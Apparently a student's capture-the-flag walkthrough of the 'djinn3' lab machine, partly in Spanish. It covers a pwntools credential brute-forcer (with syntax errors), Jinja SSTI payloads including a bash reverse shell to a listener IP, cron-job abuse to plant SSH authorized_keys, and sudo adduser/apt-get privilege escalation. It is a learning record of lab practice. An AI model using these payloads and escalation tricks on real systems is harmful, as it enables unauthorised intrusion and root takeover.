Skills:

- Applying brute force to discover valid credentials on a custom application [Python Scripting]
- Server Side Template Injection (SSTI) - Exploit the SSTI by calling subprocess.Popen
- Uncompiling pyc files with uncompyle6
- Python script analysis + Abusing cron job [User Pivoting]

- Abusing sudoers privilege in order to create a new user and read /etc/sudoers file by assigning --gid 0
- Creating a user that exists as described in the sudoers file but does not exist on the system
- Abusing sudoers privilege (apt-get) for the newly created user [Privilege Escalation]

Certifications

eWPT OSCP

As we do allways we create our workspace and then we strat the step of discovery with nmap.

a loot
```
22/tcp 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

 80/tcp    open   http     lighttpd 1.4.45
  |_http-server-header: lighttpd/1.4.45
 |_http-title: Custom-ers
5000/tcp  open   http     Werkzeug httpd 1.0.1 (Python 3.6.9)
  |_http-title: Site doesn't have a title (text/html; charset=utf-8).
  |_http-server-header: Werkzeug/1.0.1 Python/3.6.9
31337/tcp open   Elite?
 | fingerprint-strings: 

```

this ports are opened.. what is elite.. it is some kind of server of python on 5000 and the port 313337... is "elite"

the version of ssh 7,6 is vulnerable



the version as lauchpad is saying is " ubuntu bionic"
```
lighttpd 1.4.45 (bionic)
OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (bionic)
```

Werkzeug .. he said he will probe the typical route   "/console"

but now is searching with whatweb, what he allways do its a "wapalizer but on console CUI"

whatweb http://ip
whatweb http://ip:port
```
http://172.16.2.178 [200 OK] Country[RESERVED][ZZ], HTTPServer[lighttpd/1.4.45], IP[172.16.2.178], Title[Custom-ers], lighttpd[1.4.45]  
```
```
http://172.16.2.178:5000 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTTPServer[Werkzeug/1.0.1 Python/3.6.9], IP[172.16.2.178], Python[3.6.9], Werkzeug[1.0.1]
```

He said that this wil be probably vulnerable to SSTI (server side templated injection) 

the port http://ip:5000/console it doesnt woerk.. and he said that we can try to fuzze it, but we arent going to get nothing

and on this  http://172.16.2.178:5000/?id=2792

in the "id=" he is trying to do some sql injections, but this seem that is not vulnerable, and there are a message called "internal server error". The message appears because of the identifier is invalid. He said that it can be fuzzable to.. because we can put a "payload type range".

--hc(ocult state 500)
c (colored)
-t (threads, "works on paralel")
-z (payload)
(range is the type of payload)

FUZZ is the place where we are going to operate
wfuzz -c --hc=500 -t 200 -z range,0000-9999 "http://172.16.2.178:5000/?id=FUZZ"

so we dont find any other id than the disponibles on the website, but there is an interesting message :


"Currently the ticket management and viewing system is open and doesn't require any kind of authorization. We should add the support for authorization via passwords and also via user API key or token."

some of them are for different things

In some of them are information about users, but as we told the ssh here is vulnerable, so we are going to enumerate usernames on ssh

```
searchsploit ssh user enumeration
```
This exploit doesnt work for me ... python 2.7 makes me troubles because I havent a module 
```
OpenSSH 2.3 < 7.7 - Username Enumeration           | linux/remote/45939.py

```

he want to create a new "ticket" on the port 5000
Now the guy is saying that we can inject  query or sring .. he thinks that this machines is vulnerable to ssty

on the nmap scan we had a "username" and " password" authentication failed...on the port 31337.

He is sayint that if we try to connect with netcat to that port we get a "authentication failed". Now we can use a python script (with pwntool) to see if we can come inside.

Now he is going to create one

nano bruteforce.py
```
#!/usr/bin/python3
#(import pwn tools) 
#pdb is for debugging, time, signal permites you to put CTRL+C for stop the execution

from pwn import *
import sys, time, pdb, signal

# muestra el codigo hasta donde va
s.trace()




#def handler is that function that permites stop the program,with a message not succesfull(sys.exit[1])
def def_handler(sig,frame);
   print("\n\n[1] Saliendo...\n")
   sys.exit[1]
#Ctrl+C
#is requesting two parameters
signal.signal(signal.SIGINT,def_handler)
if __name__=='__main__':
    host, port= "172.16.2.178",331337
#ruta del diccionario capacidad de lectura y en formato bites

    f=open("/home/cds/xato-net-10-million-usernames.txt" , "rb")
#cycle for


#console log of the progress
p1=log.progress("Fuerza bruta")
p1.status("Iniciando proceso de fuerza bruta")

time.sleep(2)

for username in f.readlines():
#username.strip deletes "line-jump (\n)"
    username = username.strip()
    #print(username)
#timesleep did it more slowly i think this isnt on the code    
    #time.sleep(4)
    password=username

#decode , decodes byte format
p1.status("Probando la combinacion%s:%s" %(username.decode(),password.decode()))
(como el try catch de javascript)
try:

#tryes a remote conexion on the host, in a port determinated
s = remote(host , port, level='error')
#when apeares the website input username
s.recvuntil(b"username> ")
#you send the username
s.sendline(username)
s.recvuntil(b"password> ")
s.sendline(password)

#server response
#response=s.recv()

except:
 time.sleep(5)
#print(response)
time.sleep(2)

if b"authentication failed" not in response:

p1.success("Se ha encontrado credencial valida -> %s:%s" % (username.decode(), password.decode()))
sys.exit(8)
#code 8 = succesfull message



```

this is the clean bruteforce.py
```
#!/usr/bin/python3
#(import pwn tools) 
#pdb is for debugging, time, signal permites you to put CTRL+C for stop the execution

from pwn import *
import sys, time, pdb, signal


def def_handler(sig,frame);
   print("\n\n[1] Saliendo...\n")
   sys.exit[1]

signal.signal(signal.SIGINT,def_handler)


if __name__ == '__main__':
    host, port= "172.16.2.178",331337

    f=open("/home/cds/Downloads/xato-net-10-million-usernames.txt" , "rb")


    p1=log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(2)

    for username in f.readlines():

    username = username.strip()
    #print(username)
    password=username


    p1.status("Probando la combinacion%s:%s" (username.decode(),password.decode()))

    try:


        s = remote(host , port, level='error')

        s.recvuntil(b"username> ")
        s.sendline(username)
        s.recvuntil(b"password> ")
        s.sendline(password)


        response=s.recv()

     except:
        time.sleep(5)

   if b"authentication failed" not in response:
      p1.success("Se ha encontrado credencial valida -> %s:%s" % (username.decode(), password.decode()))
      sys.exit(8)
```
to launch it write: 
"python3 bruteforce.py"


```
[+] Fuerza bruta: Se ha encontrado credencial valida -> guest:guest
```

Now I will connect to the machine via netcat

```
$ nc 172.16.2.178 31337
username> guest
password> guest

Welcome to our own ticketing system. This application is still under 
development so if you find any issue please report it to mail@mzfr.me

Enter "help" to get the list of available commands.

> help

        help        Show this menu
        update      Update the ticketing software
        open        Open a new ticket
        close       Close an existing ticket
        exit        Exit

```
with open , I can add a new ticket, the website is this:
![[Screenshot_2023-08-12_15_30_46.png]]
Savitar say, if I can add things on this table, he would try a server site template injection (SSTI) 


***How you can know if something is vulnerable to STTI ? if you see that there is something where you can put and python represents some response to you (example {{'7'*7}}) it may be possible***

***The key is control the data that you obtain in the output***


Savitar proved this but i cannot get the point
```
> open
Title: {{7*7}}     
Description: {{'7'*7}}
> 
```

On the ticket wasn't a representation of a string of 7 times 7 (7777777)
```
{{7*7}}
```
On the "link" url it is represented as a
```
7777777
```
So with this validation it would be vulnerable to SSTI

With SSTI there are potential vias to read archives from the machine or executing commands

we are searching on this website a payload:

https://github.com/swisskyrepo/PayloadsAllTheThings

We can filtrate with CTRL + F on the navigator, we are going to watch server side template injection 

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

![[Screenshot_2023-08-12_15_56_05.png]]


if we put this " rlwrap nc 172.16.2.178 31337
" we can use the arrow <-- on the keyboard without problem

so... when we create new tickets we put this
```
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

So when we do this we have responses from the server

![[Screenshot_2023-08-12_16_12_15.png]]
 
Now we are going to try if we can have a interactive console.

first we listen on netcat
```
nc -nlvp 443
```

And we put this on the "tickets"
```
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/172.16.0.140/443 0>&1"').read()}}

```

And now we are inside of the machine

***Un dispositivo de terminal tty es un dispositivo de caracteres que realiza la entrada y la salida de carácter en carácter. La comunicación entre los dispositivos de terminal y los programas que los leen y escriben está controlada por la interfaz tty. Entre los ejemplos de dispositivos tty se encuentran: Módems.***

we try the terminal with to get a TTY

script /dev/null -c bash

stty raw -echo ;fg

reset xterm

TERM=xterm


lsb_release -a (we can get the version of our system)
```
www-data@djinn3:/opt/.web$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.4 LTS
Release:        18.04
Codename:       bionic
```

/opt/.web is the root of the mounted server that we are on

there are  three users but we havent credentials
```
www-data@djinn3:/home$ ls
jack  mzfr  saint
```

we have no permisions with sudo -l
and we are not in any group

so, we are going to enumerate archives which assigned privileged is SUID

```
find / -perm -4000 2>/dev/null
```

this are the , we have the pkexec for example (very vulnerable I listen it a loot)
```
www-data@djinn3:/$ find / -perm -4000 2>/dev/null
/bin/su
/bin/umount
/bin/mount
/bin/fusermount
/bin/ping
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper

```

We are going to get two files from the folder /opt , they are hidden and we need to download a program to write the archive.

```
-rwxr-xr-x  1 saint    saint    1403 Jun  4  2020 .configuration.cpython-38.pyc
-rwxr-xr-x  1 saint    saint     661 Jun  4  2020 .syncer.cpython-38.pyc
```

We listen on our machine and we send the archive with nc
![[Screenshot_2023-08-14_21_00_18.png]]

I can see the archive on python if i use this.
```
uncompyle6 syncer.pyc 
```
It doesn't work for me with uncompyle6 .. but I use an online tool and I did it ... finally 

Now he is going to enumerate process running on the computer with pspy.

We must open a server http in our computer with 
```
python3 -m http.server 80.
```
And if we want the archive we use
```
wget http://172.16.0.140/pspy64 
```
***IMPORTANT , IF YOU WANT TO GET AN ARCHIVE AND YOU HAVE NO PERMISSIONS OF USER, YOU MUST GO TO THE FOLDER /tmp AND DOWNLOAD THE FILE THERE***

Now we are giving execution permisions to the binary and then execute it


This process are executing periodically

![[Screenshot_2023-08-15_15_32_02.png]]

```
2023/08/16 00:54:02 CMD: UID=1000  PID=1166   | 
2023/08/16 00:54:02 CMD: UID=1000  PID=1165   | /bin/sh -c uname -p 2> /dev/null 
2023/08/16 00:55:53 CMD: UID=0     PID=1167   | 
2023/08/16 00:57:01 CMD: UID=1000  PID=1170   | /bin/sh -c /usr/bin/python3 /home/saint/.sync-data/syncer.py 
2023/08/16 00:57:01 CMD: UID=1000  PID=1169   | /bin/sh -c /usr/bin/python3 /home/saint/.sync-data/syncer.py 
2023/08/16 00:57:01 CMD: UID=0     PID=1168   | /usr/sbin/CRON -f 
2023/08/16 00:57:02 CMD: UID=1000  PID=1173   | /usr/bin/python3 /home/saint/.sync-data/syncer.py 
2023/08/16 00:57:02 CMD: UID=1000  PID=1174   | 
2023/08/16 01:00:01 CMD: UID=1000  PID=1178   | /bin/sh -c /usr/bin/python3 /home/saint/.sync-data/syncer.py 
2023/08/16 01:00:01 CMD: UID=1000  PID=1177   | /bin/sh -c /usr/bin/python3 /home/saint/.sync-data/syncer.py 
2023/08/16 01:00:01 CMD: UID=0     PID=1176   | /usr/sbin/CRON -f 
2023/08/16 01:00:02 CMD: UID=1000  PID=1181   | /usr/bin/python3 /home/saint/.sync-data/syncer.py 
2023/08/16 01:00:02 CMD: UID=1000  PID=1182   | uname -p 

```
the user saint is executing the "syncer.py"

in the syncer.py he is putting " from glob import glob."
And glob engloves all the archives on certain fromat. 
Unfortunately, he is using the foler 
```
(/tmp "*.json") 
```
so, if i put something, some script .json that execute itself with permissions root i can scale privileges

It is complex... but you need to analyze what is happening between this two archives on python. This make a series of validations and then put data on another archive, syncer.py call a configuration... so we are going to create that configuration

We have to create an archive called 
 
touch 02-04-2022.config.json


so, its reading something and putting where to deposite the readed file

{
"URL": "http://172.16.0.140/test"
"Output": "/tmp/prueba"
}

![[Screenshot_2023-08-15_16_29_39.png]]

Now, we need to wait until this make a petition to our server to our archive called test.

Dice que si se crea la peticion y se crea un archivo como el usuarion saint, entonces tiene una via para crear una clave publica .. contemplarla como autorized keys dentro del directorio ssh del usuario saint y poderse conectar sin proporcionar contraseña. Y si no hacer otra cosa.


So it happens, saint has created an archive called "prueba". I had some problems, because on the archive .json I forgot to put a , between two values, so it  doesn't work

The archive is owned by saint
![[Screenshot_2023-08-15_16_54_25.png]]
We are going to generate a ssh-key, but first we must remove older ones.

```
rm ~/.ssh/*
```

Now we are going to create a key with ssh keygen

```
ssh-keygen 
```
now we go to the folder

```
~/.ssh/id_rsa
```

we copy the folder on our workspace
```
cat ~/.ssh/id_rsa.pub > authorized_keys

```

now we are going to do the same, wit the python server, but trying to put that archive on the target

This will be the json archive and the folder
```
{
"URL":"http://172.16.0.140/authorized_keys",
"Output":"/home/saint/.ssh/authorized_keys"
}
```

el va a poner la clave publica de nuestra computadora en su ssh private key folder, donde el tiene capacidad de escritura

Es para yo convertirme en un usuario autorizado sin usar contraseña ... sera desde mi computadora imagino..


Yes is from my computer and finally I'm IN !!!!

```
saint@djinn3:~$ ls -la
```

On this folder are my keys

```
saint@djinn3:~/.ssh$ ls -la
total 12
drwxr-xr-x 2 saint saint 4096 Jun  4  2020 .
drwxr-x--- 7 saint saint 4096 Jun  4  2020 ..
-rw-rw-r-- 1 saint saint  561 Aug 16 06:15 authorized_keys
saint@djinn3:~/.ssh$ 
```


If the bash is pointint to the /dev/null  I cannot see the historic of the user 

```
lrwxrwxrwx 1 saint saint    9 May 17  2020 .bash_history -> /dev/null
```

next step  commands

```
saint > id
saint > sudo -l
saint > User saint may run the following commands on djinn3:
    (root) NOPASSWD: /usr/sbin/adduser,
        !/usr/sbin/adduser * sudo,
        !/usr/sbin/adduser * admin
```
I can use this... I can add users as saint
```
saint>adduser --help

```

the --uid 0 makes a root user.. but already exists

```
saint>sudo adduser cds --uid 0
```
but we can use the --gid 0 and be on the root group

```
saint>sudo adduser cds --gid 0
```

so, when i create a file for example on the folder /tmp , called  "a" , this one have root privileges as you can see 

```
-rw-r--r-- 1 cds      root        0 Aug 16 06:32 a
```

but I cant go to the /root folder, and I have other limitations, the groups are not contempled on the root folder... you must be root

but I can see the **/etc/sudoers** folder as cds user

```
# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:
# If you need a huge list of used numbers please install the nmap package.

saint ALL=(root) NOPASSWD: /usr/sbin/adduser, !/usr/sbin/adduser * sudo, !/usr/sbin/adduser * admin

jason ALL=(root) PASSWD: /usr/bin/apt-get
#includedir /etc/sudoers.d
cds@djinn3:/tmp$ 
```


the user json can use apt-get without password

we are going to create him.. because he is not on the system

sudo adduser json 
now we are jason.. its jason no json
```

saint@djinn3:~$ su jason
Password: 
jason@djinn3:/home/saint$ sudo -l
[sudo] password for jason: 
Matching Defaults entries for jason on djinn3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jason may run the following commands on djinn3:
    (root) PASSWD: /usr/bin/apt-get
jason@djinn3:/home/saint$ 

```

On this website we have some things that we can do..
https://gtfobins.github.io/gtfobins/apt-get/#sudo

```
jason@djinn3:/home/saint$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

```

And that's the end , we did it... we can take the root flag !!!!